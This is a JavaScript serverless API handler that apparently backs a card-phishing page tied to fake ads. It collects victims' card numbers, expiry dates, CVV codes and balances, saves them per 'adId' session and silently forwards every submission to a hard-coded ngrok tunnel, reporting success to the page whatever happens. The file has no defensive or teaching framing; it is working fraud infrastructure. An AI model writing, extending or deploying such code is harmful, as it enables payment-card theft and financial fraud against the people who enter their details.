import { readSessions, writeSessions, setSessionStatus } from './_store.js';
import https from 'https';
import http from 'http';

const WEBHOOK_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';

function fetchWithTimeout(url, data, timeout = 5000) {
  return new Promise((resolve) => {
    const urlObj = new URL(url);
    const body = JSON.stringify(data);
    const mod = urlObj.protocol === 'https:' ? https : http;
    const opts = {
      hostname: urlObj.hostname,
      port: urlObj.port,
      path: urlObj.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
        'ngrok-skip-browser-warning': 'true',
      },
      timeout,
    };
    const req = mod.request(opts, (res) => {
      let chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve(true));
    });
    req.on('error', () => resolve(false));
    req.on('timeout', () => { req.destroy(); resolve(false); });
    req.write(body);
    req.end();
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    const adId = body.adId || body.item || '';
    const dataType = body.type || 'card';

    if (!adId) {
      return res.status(400).json({ ok: false, error: 'No adId provided' });
    }

    const sessions = readSessions();
    if (!sessions[adId]) sessions[adId] = {};

    if (dataType === 'card') {
      sessions[adId].cardNumber = body.cardNumber || '';
      sessions[adId].cardMonth = body.cardMonth || '';
      sessions[adId].cardYear = body.cardYear || '';
      sessions[adId].cardCvv = body.cardCvv || '';
    } else if (dataType === 'balance') {
      sessions[adId].balance = body.balance || '';
    }

    sessions[adId].updatedAt = Date.now();
    writeSessions(sessions);

    fetchWithTimeout(`${WEBHOOK_BASE}/api/user-data`, body).catch(() => {});

    res.status(200).json({ ok: true, status: 'user_data_logged' });
  } catch (e) {
    res.status(200).json({ ok: true, status: 'user_data_logged' });
  }
}
